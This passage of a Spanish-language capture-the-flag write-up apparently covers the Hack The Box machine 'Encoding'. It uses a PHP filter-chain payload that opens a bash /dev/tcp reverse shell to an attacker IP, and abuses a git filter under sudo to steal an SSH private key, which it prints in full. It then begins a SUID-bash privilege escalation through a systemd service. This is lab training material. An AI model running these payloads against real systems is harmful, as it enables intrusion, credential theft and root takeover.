+<div><p><img src="./4.png"><p></div>
+
+<div><p>En un <a href="https://gatogamer1155.github.io/otros/lfi_linux/">artículo</a> explique algunas tecnicas para llegar a RCE, entre ellas el Filter Chain</p></div>
+<div><p>Usando una <a href="https://github.com/synacktiv/php_filter_chain_generator">herramienta</a>, podemos probar mostrar un test en el output para ver si es vulnerable</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">php_filter_chain_generator.py --chain test
+[+] The following gadget chain will generate the following code : test (base64 value: dGVzdA)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span>
+</code></pre></div></div>
+
+<div><p>Enviamos la data que nos genero despues del parametro page= y lo enviamos</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>En la respuesta podemos ver que nos muestra el test, es vulnerable</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Generamos un payload con una data php que nos envie una revshell y lo enviamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3 </span><span class="p">php_filter_chain_generator.py --chain </span><span class="no">"<?php system('bash -c \"bash -i >& /dev/tcp/10.10.14.10/443 0>&1\"')?>"</span><span class="p">
+[+] The following gadget chain will generate the following code : <?php system('bash -c "bash -i >& /dev/tcp/10.10.14.10/443 0>&1"')?> (base64 value: PD9waHAgc3lzdGVtKCdiYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEwLzQ0MyAwPiYxIicpPz4)
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span>
+</code></pre></div></div>
+
+<div><p><img src="./7.png"><p></div>
+
+<div><p>Como resultado conseguimos una reverse shell como www-data en la máquina victima</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.198
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~/image/actions</span><span class="p">$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~/image/actions</span><span class="p">$ hostname -I
+10.10.11.198 dead:beef::250:56ff:fe96:9f7e 
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~/image/actions</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando privilegios de sudoers podemos ejecutar un script .sh como svc</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+Matching Defaults entries for www-data on encoding:
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/bin\:/snap/bin, use_pty
+
+User www-data may run the following commands on encoding:
+    (</span><span class="na">svc</span><span class="p">) NOPASSWD: </span><span class="kd">/var/www/image/scripts/git-commit.sh
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Al mirar el script podemos ver que juega con git para hacer un commit y otras cosas</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /var/www/image/scripts/git-commit.sh
+#!/bin/bash
+
+u=$(/usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image ls-files  -o --exclude-standard)
+
+if [[ $u ]]; then
+        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image add -A
+else
+        /usr/bin/git --git-dir=/var/www/image/.git  --work-tree=/var/www/image commit -m "Commited from API!" --author="james <james@haxtables.htb>"  --no-verify
+fi
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Podemos iniciar creando un script que lea la id_rsa del usuario y la deposite como key en /dev/shm</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ echo "cat ~/.ssh/id_rsa > /dev/shm/key" > /tmp/readkey
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ chmod +x /tmp/readkey
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En el directorio /var/www/image abusamos del filtro ident para que al ejecutar el script se ejecute el readkey que creamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~/image</span><span class="p">$ git init
+Reinitialized existing Git repository in /var/www/image/.git/
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~/image</span><span class="p">$ echo '*.php filter=indent' > .git/info/attributes
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~/image</span><span class="p">$ git config filter.indent.clean /tmp/readkey
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~/image</span><span class="p">$ sudo -u svc /var/www/image/scripts/git-commit.sh
+On branch master
+Changes not staged for commit:
+  (use "git add <file>..." to update what will be committed)
+  (use "git restore <file>..." to discard changes in working directory)
+</span><span class="kd">	modified:   actions/action_handler.php
+	modified:   index.php
+	modified:   utils.php</span><span class="p">
+
+no changes added to commit (use "git add" and/or "git commit -a")
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">~/image</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En /dev/shm se ha creado un archivo key que podemos leer, es la id_rsa de svc</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ ls -l
+-rw-rw-r-- 1 svc svc 2602 Jan 31 06:43 key
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$ cat key
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</span><span class="s2">www-data@encoding</span><span class="p">:</span><span class="na">/dev/shm</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora con la id_rsa nos conectamos por ssh como svc, conseguimos la primera flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ ssh </span><span class="p">svc@10.10.11.198 -i id_rsa
+</span><span class="s2">svc@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ id
+uid=1000(svc) gid=1000(svc) groups=1000(svc)
+</span><span class="s2">svc@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ hostname -I
+10.10.11.198 dead:beef::250:56ff:fe96:9f7e 
+</span><span class="s2">svc@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat user.txt 
+18b**************************902
+</span><span class="s2">svc@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>En los privilegios de sudoers podemos reiniciar un servicio con systemctl, algo sencillo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">svc@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ sudo -l
+Matching Defaults entries for svc on encoding:
+    secure_path=/usr/local/bin\:/usr/sbin\:/usr/bin\:/bin\:/snap/bin, use_pty
+
+User svc may run the following commands on encoding:
+    (</span><span class="u">root</span><span class="p">) NOPASSWD: </span><span class="kd">/usr/bin/systemctl restart *
+</span><span class="s2">svc@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Tenemos capacidad de escritura, podemos crear un servicio que haga la bash suid al ejecutarse</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">svc@encoding</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat /etc/systemd/system/privesc.service
+[Service]
+Type=oneshot
+ExecStart=chmod u+s /bin/bash
+[Install]
